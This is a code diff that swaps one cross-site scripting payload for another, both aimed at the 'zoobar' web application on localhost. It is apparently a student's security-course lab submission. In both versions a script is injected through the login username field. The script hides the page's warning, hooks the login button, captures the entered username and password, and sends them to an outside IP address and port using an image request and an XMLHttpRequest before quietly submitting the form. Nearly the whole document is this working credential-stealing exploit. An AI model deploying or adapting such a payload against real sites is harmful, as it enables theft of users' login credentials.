@@ -1,44 +1,33 @@
-<form hidden name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
-<table>
-    <tbody>
-        <tr>
-            <td>Username:</td>
-            <td><input type="text" name="login_username" size="20" autocomplete="no" value=""></td>
-        </tr>
-        <tr>
-            <td>Password:</td>
-            <td colspan="2"><input type="password" name="login_password" size="20" autocomplete="no">
-            <input type="button" id="myBtn" name="submit_login" value="Log in">
-            <input type="submit" name="submit_registration" value="Register"></td>
-        </tr>
-    </tbody>
-</table>
-<input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
-</form>
-<script>
-    var js = function(){
-        document.addEventListener("DOMContentLoaded", run, false);
-        function run(e) {
-            document.getElementsByClassName("footer warning")[0].style.visibility = "hidden";
-            document.getElementsById("myBtn").addEventListener("click", foo);
-        }
-    };
-    var foo = function(){
-        var fries = document.getElementsByName("login_username")[0].value;
-        var fishy = document.getElementsByName("login_password")[0].value;
-        var ip = "172.27.19.10:12345";
-        var ur = "http://"+ip+"/?payload="+encodeURI(fries)+","+encodeURI(fishy);
-        new Image().src = ur
-        }
-    var st = "\">"+
-        "<img id=\"scary\" style=\"display: hidden\"/>"+
-        "<script id=\"scary2\"><\/script>"+
-        "<script>"+
-            "var foo = " + foo.toString() + ";" +
-            "var main = " + js.toString() + ";" +
-            "main();"+
-        "<\/script>"+
-        "<input hidden id=\"";
-    document.getElementsByName("login_username")[0].value = st;
-    document.getElementsByName("submit_login")[0].click();
-</script>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+    <form method="POST" style="display:none" id="form" action="http://localhost:8080/zoobar/index.cgi/login">
+        <input id="input" type="text" value='' name="login_username">
+    </form>
+    <script type="text/javascript">
+        document.getElementById('input').value = '">'
+            + '<style>.warning{display:none}</style>'
+            + '<script>'
+                + 'document.addEventListener("DOMContentLoaded", function () {'
+                    + 'console.log("done");'
+                    + 'document.getElementsByName("submit_login")[0].setAttribute("type", "button");'
+                    + 'document.getElementsByName("submit_login")[0].addEventListener("click", function(e){'
+                        + 'console.log("done2");'
+                        + 'var username = document.getElementsByName("login_username")[0].value;'
+                        + 'var password = document.getElementsByName("login_password")[0].value;'
+                        + 'var xhttp = new XMLHttpRequest();'
+                        + 'console.log("done3");'
+                        + 'new Image().src = "http://172.27.19.10:12345?payload="+username+","+password+"&roll=13464&random=" + Math.random() + "/" ;'
+                        + 'setTimeout(document.forms[0].submit(), 500);'
+                        +' xhttp.open("GET", "http://172.27.19.10:12345?payload="+username+","+password+"&roll=13464&random=" + Math.random() + "/", true);'
+                        + 'console.log("don4");'
+                        +'xhttp.send();'
+                    + '});'
+                +'});'  
+            + '<\/script><input name="rand" value="Log in" type="hidden';
+        document.getElementById('form').submit();
+    </script>
+</body>
